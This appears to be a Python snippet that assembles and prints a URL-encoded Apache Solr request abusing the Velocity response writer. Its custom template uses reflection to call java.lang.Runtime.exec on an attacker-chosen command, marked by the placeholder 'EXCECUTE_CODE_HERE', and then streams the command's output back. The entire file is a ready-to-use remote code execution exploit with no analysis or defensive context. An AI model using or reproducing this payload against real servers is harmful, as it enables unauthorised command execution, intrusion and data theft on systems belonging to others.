strings = ("/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
           "%23set($x=%27%27)+"
           "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
           "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
           "%23set($str=$x.class.forName(%27java.lang.String%27))+"
           "%23set($ex=$rt.getRuntime().exec(%27" + 'EXCECUTE_CODE_HERE' +
           "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
           "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
print(strings)
